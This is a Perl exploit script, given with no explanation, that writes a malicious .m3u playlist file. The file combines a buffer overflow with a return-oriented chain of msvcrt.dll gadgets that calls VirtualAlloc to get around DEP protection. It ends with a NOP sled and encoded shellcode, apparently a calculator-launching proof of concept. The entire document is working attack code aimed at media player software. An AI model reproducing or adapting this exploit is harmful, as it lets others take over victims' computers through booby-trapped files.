$file= "calc.m3u";

$buffer= "\\";
$buffer .="A" x 137;
$buffer .= pack('V',0x77c11110);#first ret

$buffer .= pack('V',0x77c2e75b);  # POP EBP # RETN [msvcrt.dll]
$buffer .= pack('V',0x77c2e75b);  # skip 4 bytes [msvcrt.dll]
$buffer .= pack('V',0x77c53436);  # POP EBX # RETN [msvcrt.dll]
$buffer .= pack('V',0xffffffff);  #
$buffer .= pack('V',0x77c127e5);  # INC EBX # RETN [msvcrt.dll]
$buffer .= pack('V',0x77c127e1);  # INC EBX # RETN [msvcrt.dll]
$buffer .= pack('V',0x77c3b860);  # POP EAX # RETN [msvcrt.dll]
$buffer .= pack('V',0x2cfe1467);  # put delta into eax (-> put 0x00001000 into edx)
$buffer .= pack('V',0x77c4eb80);  # ADD EAX);75C13B66 # ADD EAX);5D40C033 # RETN [msvcrt.dll]
$buffer .= pack('V',0x77c58fbc);  # XCHG EAX);EDX # RETN [msvcrt.dll]
$buffer .= pack('V',0x77c34de1);  # POP EAX # RETN [msvcrt.dll]
$buffer .= pack('V',0x2cfe04a7);  # put delta into eax (-> put 0x00000040 into ecx)
$buffer .= pack('V',0x77c4eb80);  # ADD EAX);75C13B66 # ADD EAX);5D40C033 # RETN [msvcrt.dll]
$buffer .= pack('V',0x77c14001);  # XCHG EAX);ECX # RETN [msvcrt.dll]
$buffer .= pack('V',0x77c47a26);  # POP EDI # RETN [msvcrt.dll]
$buffer .= pack('V',0x77c47a42);  # RETN (ROP NOP) [msvcrt.dll]
$buffer .= pack('V',0x77c3a184);  # POP ESI # RETN [msvcrt.dll]
$buffer .= pack('V',0x77c2aacc);  # JMP [EAX] [msvcrt.dll]
$buffer .= pack('V',0x77c5289b);  # POP EAX # RETN [msvcrt.dll]
$buffer .= pack('V',0x77c1110c);  # ptr to &VirtualAlloc() [IAT msvcrt.dll]
$buffer .= pack('V',0x77c12df9);  # PUSHAD # RETN [msvcrt.dll]
$buffer .= pack('V',0x77c354b4);  # ptr to 'push esp # ret ' [msvcrt.dll]


$buffer .= "\x90" x 20;
$buffer .="\x6a\x31\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x27" .
"\xc4\x1a\xee\x83\xeb\xfc\xe2\xf4\xdb\x2c\x98\xee\x27\xc4" .
"\x7a\x67\xc2\xf5\xda\x8a\xac\x94\x2a\x65\x75\xc8\x91\xbc" .
"\x33\x4f\x68\xc6\x28\x73\x50\xc8\x16\x3b\xb6\xd2\x46\xb8" .
"\x18\xc2\x07\x05\xd5\xe3\x26\x03\xf8\x1c\x75\x93\x91\xbc" .
"\x37\x4f\x50\xd2\xac\x88\x0b\x96\xc4\x8c\x1b\x3f\x76\x4f" .
"\x43\xce\x26\x17\x91\xa7\x3f\x27\x20\xa7\xac\xf0\x91\xef" .
"\xf1\xf5\xe5\x42\xe6\x0b\x17\xef\xe0\xfc\xfa\x9b\xd1\xc7" .
"\x67\x16\x1c\xb9\x3e\x9b\xc3\x9c\x91\xb6\x03\xc5\xc9\x88" .
"\xac\xc8\x51\x65\x7f\xd8\x1b\x3d\xac\xc0\x91\xef\xf7\x4d" .
"\x5e\xca\x03\x9f\x41\x8f\x7e\x9e\x4b\x11\xc7\x9b\x45\xb4" .
"\xac\xd6\xf1\x63\x7a\xae\x1b\x63\xa2\x76\x1a\xee\x27\x94" .
"\x72\xdf\xac\xab\x9d\x11\xf2\x7f\xea\x5b\x85\x92\x72\x48" .
"\xb2\x79\x87\x11\xf2\xf8\x1c\x92\x2d\x44\xe1\x0e\x52\xc1" .
"\xa1\xa9\x34\xb6\x75\x84\x27\x97\xe5\x3b\x44\xa5\x76\x8d" .
"\x09\xa1\x62\x8b\x27\xc4\x1a\xee";





open($FILE,">$file");
print $FILE $buffer;
close($FILE);
